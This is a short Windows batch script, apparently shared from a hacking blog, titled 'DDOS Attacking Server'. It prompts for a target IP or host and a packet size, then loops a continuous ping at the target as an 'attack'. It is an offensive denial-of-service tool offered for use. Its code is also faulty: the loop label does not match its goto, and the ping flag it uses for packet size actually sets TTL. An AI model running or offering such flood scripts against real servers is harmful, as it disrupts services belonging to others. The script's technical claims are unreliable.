@echo off
mode 67,16
title DDOS Attacking Server
color 0c
cls
echo ==================================
echo = Hacking Tools =
echo ==================================
echo.
echo +++++++++++++++++++++++++++++++++++
echo + Name : DDOS Attacking Server +
echo + Author : Sandy Rizqia Putra +
echo + Visit : 408hack.blogspot.com +
echo ++++++++++++++++++++++++++++++++++
echo.
goto Next
echo.
echo DDOS With Batchfile
echo.
set /p x=Server-Target:
echo.
ping %x%
@ping.exe 127.0.0.1 -n 5 -w 1000 > nul
goto Next
:Next
echo.
echo **********************************
echo * Masukan IP / Host Target *
echo **********************************
echo.
set /p m=ip Host:
echo.
set /p n=Packet Size:
echo.
:/DDOS
color 0b
echo Attacking Server %m%
ping %m% -i %n% -t >nul
goto DDOS